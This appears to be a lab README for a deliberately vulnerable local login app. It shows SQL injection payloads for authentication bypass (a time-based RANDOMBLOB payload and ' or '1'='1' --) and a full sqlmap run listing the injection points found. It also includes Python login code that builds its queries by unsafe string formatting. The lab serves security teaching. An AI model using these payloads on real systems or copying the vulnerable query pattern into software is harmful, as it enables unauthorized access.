<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/authentication-bypass/main/content/authentication-bypass.svg"></p>

An adversary may gain access to data and functionalities by bypassing the target authentication mechanism

Clone this current repo recursively
```sh
git clone --recurse-submodules https://github.com/qeeqbox/authentication-bypass
```
Run the webapp using Python
```sh
python3 authentication-bypass/vulnerable-web-app/webapp.py
```
Open the webapp in your browser 127.0.0.1:5142
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/authentication-bypass/main/content/1.png"></p>
Right-click on the page and open Developer Tools, then Networking (This will be used to determine the time taken for the web application to respond for login)
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/authentication-bypass/main/content/2.png"></p>
Type in the username: ' OR RANDOMBLOB(1000000000/2)-- and password: test, if executed, the web application will be vulnerable to blind SQL injection, and that payload will cause a delay
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/authentication-bypass/main/content/3.png"></p>
The payload was executed successfully and caused a delay
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/authentication-bypass/main/content/4.png"></p>
You be using the blind SQL injection to login as admin, enter ' or '1' = '1' -- for both username and password
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/authentication-bypass/main/content/5.png"></p>
You are logged as admin
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/authentication-bypass/main/content/6.png"></p>


```sh
user@users-Mac-mini vulnerable-web-app % sqlmap http://127.0.0.1:5142/login --data 'username=test&password=test' -p 'username' --dbms=sqlite --level 5 --risk 3 --ignore-code 401 --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:20:04 /2025-07-26/

[11:20:04] [INFO] testing connection to the target URL
[11:20:04] [INFO] testing if the target URL content is stable
[11:20:05] [INFO] target URL content is stable
[11:20:05] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[11:20:05] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[11:20:05] [INFO] testing for SQL injection on POST parameter 'username'
[11:20:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:20:05] [WARNING] reflective value(s) found and filtering out
[11:20:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
got a 302 redirect to 'http://127.0.0.1:5142/'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[11:20:05] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[11:20:05] [INFO] testing 'Generic inline queries'
[11:20:05] [INFO] testing 'SQLite inline queries'
[11:20:05] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[11:20:05] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[11:20:05] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[11:20:05] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[11:20:13] [INFO] POST parameter 'username' appears to be 'SQLite > 2.0 OR time-based blind (heavy query)' injectable 
[11:20:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:20:13] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:20:13] [INFO] target URL appears to be UNION injectable with 7 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[11:20:13] [INFO] testing 'Generic UNION query (99) - 21 to 40 columns'
[11:20:13] [INFO] testing 'Generic UNION query (99) - 41 to 60 columns'
[11:20:14] [INFO] testing 'Generic UNION query (99) - 61 to 80 columns'
[11:20:14] [INFO] testing 'Generic UNION query (99) - 81 to 100 columns'
[11:20:14] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[11:20:14] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 304 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-6373' OR 4741=4741-- IGcq&password=test

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=test' OR 3859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- atch&password=test
---
[11:20:14] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[11:20:14] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 240 times
[11:20:14] [INFO] fetched data logged to text files under '/Users/user/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 11:20:14 /2025-07-26/
```

## Code
When user send a username and password in POST request to the login route, the check_creds() is called 
```py
if parsed_url.path == "/login" and "username" in post_request_data and "password" in post_request_data:
    ret = self.check_creds(post_request_data['username'][0],post_request_data['password'][0])
    if isinstance(ret, list) and ret[0] == "valid":
        self.send_content(302, self.gen_cookie(ret[1],60*15)+[('Location', URL)], None)
        self.log_message("%s logged in" % post_request_data['username'][0])
        return
    elif isinstance(ret, list) and ret[0] == "password":
        self.send_content(401, [('Content-type', 'text/html')], self.msg_page(f"Password is wrong".encode("utf-8"), b"login"))
        return
    elif isinstance(ret, list) and ret[0] == "username" or isinstance(ret, list) and ret[0] == "error":
        self.send_content(401, [('Content-type', 'text/html')], self.msg_page(f"User {post_request_data['username'][0]} doesn't exist".encode("utf-8"), b"login"))
        return
```
The check_creds() function checks if the username and password value are valid credentials; it does not check if either is sanitized or valid
```py
def check_creds(self, username, password):
    try:
        with connect(DATABASE, isolation_level=None, check_same_thread=False) as connection:
            cursor = connection.cursor()
            ret = cursor.execute("SELECT * FROM users WHERE username='%s'" % (username)).fetchall()
            if ret:
                ret = cursor.execute("SELECT * FROM users WHERE username='%s' AND hash='%s'" % (username,sha512(password.encode("utf-8")+SALT).hexdigest())).fetchone()
                if ret:
                    return ["valid",ret]
                else:
                    return ["password",ret]
            else:
                return ["username", username]
    except Exception as e:
        return ["error",str(e).encode("utf-8")] 
```